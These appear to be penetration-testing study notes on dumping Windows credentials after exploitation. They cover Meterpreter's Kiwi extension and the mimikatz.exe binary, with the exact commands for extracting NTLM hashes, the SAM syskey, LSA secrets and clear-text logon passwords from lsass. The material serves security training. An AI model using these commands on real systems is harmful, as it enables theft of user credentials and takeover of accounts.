
- Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy (@gentilkiwi). It allows for the extraction of clear-text passwords, hashes and Kerberos tickets from memory.

- The SAM (Security Account Manager) database, is a database file on Windows systems that stores hashed user passwords.

- Mimikatz can be used to extract hashes from the lsass.exe process memory where hashes are cached for quick access.

- We can utilize the pre-compiled mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension Kiwi.

### How to use `Kiwi`  ?

1. Get initial access to the target using `MSF`.
2. Migrate to `lsass.exe` which will elevate privileges to `NT AUTHORITY/SYSTEM`.
3. To get started, first load the inbuilt `meterpreter` module, kiwi. `load kiwi`
4. We can now use command `creds_all`. This will dump all the user credentials.
5. We can also use `lsa_dump_sam`. 
	+ This will dump all the `NTLM` hashes for all the user accounts on the system. 
	+ This will also dump the `syskey` with which the SAM database is encrypted.
6. We can use `lsa_dump_secrets`
	+ In some cases, this can provide us with the user credentials in plain text.

### How to use `mimikatz.exe` ?

1. Navigate to the Temp directory.
2. Upload the `mimikatz.exe` file -
```
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```
3. Open a command shell session -`shell`
4. Execute Mimikatz - `.\mimikatz.exe`. This will open the Mimikatz console.
5. Check if we have the required privileges for hash extraction
```
privilege::debug
```
6. To dump the contents of the `lsass` process-
```
lsadump::sam
```
- It is equivalent to the kiwi command `lsa_dump_sam`
- This will provide us much more information than what Kiwi would.

7. To dump secrets (Kiwi equivalent of `lsa_dump_secrets`)-
```
lsadump::secrets
```

8. One advantage of this executable is- if the Windows is configured to store logon password in clear text in memory, Mimikatz can show us those passwords.
```
sekurlsa::logonpasswords
```
- If all the passwords are set to `(null)`, it indicates that clear text passwords are disabled.